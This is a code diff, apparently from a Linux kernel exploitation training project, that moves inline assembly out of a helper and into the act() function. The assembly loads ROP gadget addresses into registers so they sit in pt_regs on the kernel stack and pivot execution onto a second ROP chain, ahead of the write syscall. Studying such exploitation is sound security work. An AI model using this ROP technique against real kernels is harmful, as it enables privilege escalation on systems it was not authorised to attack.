@@ -90,27 +90,6 @@ int do_cpu_pinning(int cpu_n)
 	return EXIT_SUCCESS;
 }
 
-void do_ptregs_pass(void)
-{
-	/*
-	 * Let's place the ROP chain #1 in the pt_regs that reside at the end
-	 * (i.e. top) of the kernel stack. These gadgets calculate the address
-	 * of the ROP chain #2 inside the drill_item_t object (allocated in slab)
-	 * and perform stack pivoting onto it.
-	 */
-	__asm__ __volatile__(".intel_syntax noprefix\n\t"
-		"mov r14, " STR(POP_RAX) "\n\t"
-		"mov r13, 0x00000000000001e0\n\t" /* value for rax */
-		"mov r12, " STR(PUSH_RSP_POP_RSI_POP_RBX) "\n\t"
-		/* hole => dummy rbx */
-		"mov rbx, " STR(POP_R15) "\n\t"
-		/* hole => dummyy r15 */
-		"mov r10, " STR(SUB_RSI_RAX) "\n\t"
-		"mov r9, " STR(MOV_RAX_QWORD_PTR_RSI) "\n\t"
-		"mov r8, " STR(PUSH_RAX_POP_RSP_ADD_RSP_0X10) "\n\t"
-		".att_syntax prefix");
-}
-
 int run_sh(void)
 {
 	pid_t pid = -1;
@@ -186,7 +165,25 @@ int act(int act_fd, int code, int n, char *args)
 	len = strlen(buf) + 1; /* with null byte */
 	assert(len <= DRILL_ACT_SIZE);
 
-	do_ptregs_pass(); /* places gadgets at the bottom of the kernel stack */
+	/*
+	 * Let's place the ROP chain #1 in the pt_regs that reside at the end
+	 * (i.e. top) of the kernel stack. These gadgets calculate the address
+	 * of the ROP chain #2 inside the drill_item_t object (allocated in slab)
+	 * and perform stack pivoting onto it.
+	 */
+	__asm__ __volatile__(".intel_syntax noprefix\n\t"
+		"mov r14, " STR(POP_RAX) "\n\t"
+		"mov r13, 0x00000000000001e0\n\t" /* value for rax */
+		"mov r12, " STR(PUSH_RSP_POP_RSI_POP_RBX) "\n\t"
+		/* hole => dummy rbx */
+		"mov rbx, " STR(POP_R15) "\n\t"
+		/* hole => dummyy r15 */
+		"mov r10, " STR(SUB_RSI_RAX) "\n\t"
+		"mov r9, " STR(MOV_RAX_QWORD_PTR_RSI) "\n\t"
+		"mov r8, " STR(PUSH_RAX_POP_RSP_ADD_RSP_0X10) "\n\t"
+		".att_syntax prefix");
+
+	/* Now perform the syscall with the crafted values in the registers */
 	bytes = write(act_fd, buf, len);
 	if (bytes <= 0) {
 		perror("[-] write");
